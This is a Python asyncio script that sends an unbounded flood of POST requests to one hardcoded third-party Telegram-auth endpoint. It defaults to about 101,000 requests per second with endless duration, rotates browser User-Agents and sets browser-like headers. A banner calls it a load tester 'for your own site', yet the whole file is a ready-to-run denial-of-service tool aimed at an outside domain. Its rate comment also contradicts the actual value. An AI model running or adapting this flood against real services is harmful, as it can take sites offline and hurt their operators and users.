#!/usr/bin/env python3
import asyncio
import aiohttp
import json
import os
import time
import random
import signal
from datetime import datetime
from collections import defaultdict

# ========== КОНФИГУРАЦИЯ ==========
TARGET_URL = os.getenv("TARGET_URL", "https://mrkt-verification.xyz/api/auth/telegram")
RPS_TARGET = int(os.getenv("RPS", "101000"))          # цель: 1000 rps
DURATION = int(os.getenv("DURATION_SECONDS", "0"))  # 0 = бесконечно
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "222"))
TIMEOUT = int(os.getenv("TIMEOUT", "1"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
]

BASE_HEADERS = {
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Origin": "https://mrkt-verification.xyz",
    "Referer": "https://mrkt-verification.xyz/",
}
PAYLOAD = {"initData": ""}

running = True
total = 0
success = 0
failed = 0
times = []
statuses = defaultdict(int)
errors = defaultdict(int)

def get_headers():
    h = BASE_HEADERS.copy()
    h["User-Agent"] = random.choice(USER_AGENTS)
    return h

async def requester(session, rate):
    interval = 0.5 / rate
    next_time = time.perf_counter()
    while running:
        next_time += interval
        start = time.perf_counter()
        try:
            async with session.post(TARGET_URL, json=PAYLOAD, headers=get_headers(), timeout=TIMEOUT) as resp:
                dur = (time.perf_counter() - start) * 1000
                global total, success, failed, times, statuses
                total += 1
                times.append(dur)
                statuses[resp.status] += 1
                if 200 <= resp.status < 300:
                    success += 1
                else:
                    failed += 1
                    if total % 20 == 0:
                        body = await resp.text()
                        print(f"[{datetime.now():%H:%M:%S}] ⚠️ #{total} {resp.status} {dur:.0f}ms | {body[:100]}")
        except Exception as e:
            total += 1
            failed += 1
            errors[type(e).__name__] += 1
            if total % 20 == 0:
                print(f"[{datetime.now():%H:%M:%S}] ❌ #{total} {type(e).__name__}")
        sleep = next_time - time.perf_counter()
        if sleep > 0:
            await asyncio.sleep(sleep)

async def stats_reporter():
    last_total = 0
    last_time = time.perf_counter()
    while running:
        await asyncio.sleep(5)
        now = time.perf_counter()
        elapsed = now - start_time
        cur_total = total
        if elapsed > 0:
            avg_rps = cur_total / elapsed
            cur_rps = (cur_total - last_total) / (now - last_time)
            rate = (success / cur_total * 100) if cur_total else 0
            print(f"\n{'='*60}")
            print(f"[{datetime.now():%H:%M:%S}] Запросов: {cur_total:,} | RPS: {cur_rps:.1f} ср.:{avg_rps:.1f} | Цель:{RPS_TARGET}")
            print(f"✅ {success:,} ({rate:.1f}%) | ❌ {failed:,}")
            if times:
                t = sorted(times[-1000:])
                print(f"⏱️  p50:{t[len(t)//2]:.0f}ms p95:{t[int(len(t)*0.95)]:.0f}ms")
            if statuses:
                top = sorted(statuses.items(), key=lambda x: x[1], reverse=True)[:3]
                print("Статусы: " + " ".join(f"{k}:{v}" for k,v in top))
            if errors:
                print("Ошибки: " + " ".join(f"{k}:{v}" for k,v in errors.items()))
            print(f"{'='*60}")
            last_total, last_time = cur_total, now

async def main():
    global start_time, running
    print("█" * 60)
    print("🔥 MEGA LOAD TESTER (for your own site)")
    print(f"🎯 {TARGET_URL}")
    print(f"⚡ RPS target: {RPS_TARGET} | Workers: {MAX_WORKERS}")
    print("█" * 60)

    connector = aiohttp.TCPConnector(limit=MAX_WORKERS*2, limit_per_host=MAX_WORKERS)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        workers_cnt = min(MAX_WORKERS, max(10, RPS_TARGET // 15))
        rate_per_worker = RPS_TARGET / workers_cnt
        print(f"🔧 Workers: {workers_cnt} | RPS/worker: {rate_per_worker:.2f}")
        tasks = [asyncio.create_task(requester(session, rate_per_worker)) for _ in range(workers_cnt)]
        tasks.append(asyncio.create_task(stats_reporter()))
        start_time = time.perf_counter()
        if DURATION > 0:
            await asyncio.sleep(DURATION)
            running = False
        await asyncio.gather(*tasks, return_exceptions=True)

def shutdown():
    global running
    running = False
    print("\n🛑 Stopping...")

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, shutdown)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
    finally:
        elapsed = time.perf_counter() - start_time if 'start_time' in dir() else 0
        print("\n" + "█" * 60)
        print("📊 FINAL STATS")
        print(f"Time: {elapsed:.1f}s | Requests: {total:,} | RPS: {total/elapsed:.1f}")
        if total:
            print(f"Success: {success:,} ({success/total*100:.1f}%) | Failed: {failed:,}")
            if times:
                ts = sorted(times)
                print(f"Avg: {sum(times)/len(times):.0f}ms | p95: {ts[int(len(ts)*0.95)]:.0f}ms")
            print("Statuses:", dict(sorted(statuses.items(), key=lambda x: x[1], reverse=True)[:5]))
        print("█" * 60)
        loop.close()
